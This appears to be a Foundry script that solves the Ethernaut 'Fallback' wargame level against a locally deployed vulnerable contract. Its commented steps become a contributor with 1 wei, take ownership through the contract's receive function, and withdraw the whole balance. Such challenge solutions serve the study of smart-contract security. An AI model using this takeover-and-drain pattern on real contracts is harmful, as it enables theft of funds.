// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {Fallback} from "../src/Fallback.sol";

contract FallbackSolution is Script {
    // $ forge script script/Fallback.s.sol

    function run() external {
        address deployer = makeAddr("deployer");
        address attacker = makeAddr("attacker");
        vm.deal(deployer, 1 ether);
        vm.deal(attacker, 1 ether);
        vm.startPrank(deployer);
        Fallback fallbackInstance = new Fallback();

        console.log("Owner:", fallbackInstance.owner());
        vm.stopPrank();

        // ---- Attack Starts From here ---

        // - As you can see in the contract, we need to be the owner of the contract, to crack it.
        // - the contract has a `receive` function, so we can't send ETH to it.
        // - To be the new owner, the `receive` function checks the sender, sends ETH, and he is one of the contributors.
        // - We will fire `contribute` function, and send 1 wei, so we will be one of the contributors.
        // - Then we will send ETH to the `Fallback` contract (1 wei), since we are one of the contributors, we will path the check, and we will be the owner of the contract.
        // - We passed the first requirement and became the owners of the contract.
        // - We can simply call `withdraw` and take all `Fallback` ETH since we are the new owners.

        vm.startPrank(attacker);
        fallbackInstance.contribute{value: 1 wei}();
        (bool success,) = address(fallbackInstance).call{value: 1 wei}("");
        require(success, "Revert sending 1 wei to `fallbackInstance`");
        console.log("New Owner:", fallbackInstance.owner()); // We became the owners
        fallbackInstance.withdraw();
        console.log("fallbackInstance balance", address(fallbackInstance).balance);
        vm.stopPrank();
    }
}
